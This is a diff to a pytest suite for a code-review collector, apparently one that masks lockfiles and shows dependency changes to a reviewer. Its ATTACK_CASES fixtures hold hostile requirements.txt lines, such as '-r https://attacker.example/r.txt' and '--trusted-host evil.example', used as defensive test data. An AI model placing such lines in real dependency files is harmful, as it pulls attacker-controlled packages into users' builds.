@@ -19,6 +19,7 @@ import pytest
 
 from oc_review import collect as c
 from oc_review import deps, envelope, linediff, prefilter, render, verdict
+from oc_review.snapshot import ChangedFile
 
 FIXTURES = Path(__file__).parent / "fixtures" / "collect"
 API_REPO = "/repos/OperationCode/back-end"
@@ -2191,7 +2192,7 @@ def test_unavailable_file_is_no_text():
     assert files["small.txt"]["model_view"] == "full"
 
 
-def test_renamed_lockfile_keeps_the_mask_by_its_old_path():
+def test_deleted_lockfile_is_masked_and_the_add_is_not():
     lock = f'hash = "sha256:{"ab" * 32}"\n'
     col, _, _ = run(_snapshot({"poetry.lock": ("100644", lock)}, {"vendor/lock.txt.bak": ("100644", lock + "x = 1\n")}))
     files = files_by_path(col)
@@ -2201,9 +2202,46 @@ def test_renamed_lockfile_keeps_the_mask_by_its_old_path():
     assert files["vendor/lock.txt.bak"]["model_view"] == "full"
 
 
+def test_identical_blob_rename_of_a_lockfile_keeps_the_lockfile_view():
+    lock = f'hash = "sha256:{"ab" * 32}"\n'
+    col, _, _ = run(_snapshot({"poetry.lock": ("100644", lock)}, {"vendor/lock.txt.bak": ("100644", lock)}))
+    (f,) = col.envelope["payload"]["files"]
+    assert (f["status"], f["old_path"]) == ("renamed", "poetry.lock")
+    assert (f["model_view"], f["model_view_reason"]) == ("diff-only", "lockfile")
+    assert "content" not in f and f["head_content"] == lock
+
+
+def test_file_entry_uses_the_old_path_for_the_lockfile_rule():
+    base = f'hash = "sha256:{"ab" * 32}"\n'
+    head = f'hash = "sha256:{"cd" * 32}"\n'
+    blobs = {prefilter.git_blob_sha(base.encode()): base.encode(), prefilter.git_blob_sha(head.encode()): head.encode()}
+    shas = list(blobs)
+
+    def entry(path: str, old_path: str | None) -> dict:
+        change = ChangedFile(path, "renamed" if old_path else "modified", old_path, shas[0], shas[1], "100644", "100644")
+        cov = prefilter.FileCoverage(path, "full")
+        return c._file_entry(change, cov, blobs, {}, prefilter.MAX_BLOB_BYTES, linediff.WorkBudget())
+
+    f = entry("vendor/lock.txt.bak", "poetry.lock")
+    assert (f["model_view"], f["model_view_reason"]) == ("diff-only", "lockfile")
+    assert "content" not in f and f["head_content"] == head
+    assert "+hash = \"sha256:cdcdcdcd~\"" in f["patch"]
+    # The same change with no lockfile path on either side: full, not masked.
+    g = entry("vendor/lock.txt.bak", "old/lock.txt.bak")
+    assert g["model_view"] == "full" and g["content"] == head and "~" not in g["patch"]
+
+
+QUERY_DATA = "sha384-" + "AbCd" * 16
 ATTACK_CASES = [
     ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", "-r https://attacker.example/r.txt\nrequests==2.31.0\n",
      ["-r https://attacker.example/r.txt"]),
+    # A hash-shaped query value is data in a URL: never masked (review T2, finding 1).
+    ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", f"-r https://example.org/?q={QUERY_DATA}\nrequests==2.31.0\n",
+     [f"-r https://example.org/?q={QUERY_DATA}"]),
+    ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", f'-r https://example.org/?a="&q={QUERY_DATA}\nrequests==2.31.0\n',
+     [f'-r https://example.org/?a="&q={QUERY_DATA}']),
+    ("requirements.txt", "requests==2.31.0\n", f"pkg @ //example.org/x?q={QUERY_DATA}\nrequests==2.31.0\n",
+     [f"pkg @ //example.org/x?q={QUERY_DATA}"]),
     ("requirements.txt", "requests==2.31.0\n", "--trusted-host evil.example\nrequests==2.31.0\n",
      ["--trusted-host evil.example"]),
     ("requirements.txt", f"--require-hashes\nrequests==2.31.0 --hash=sha256:{'ab' * 32}\n",
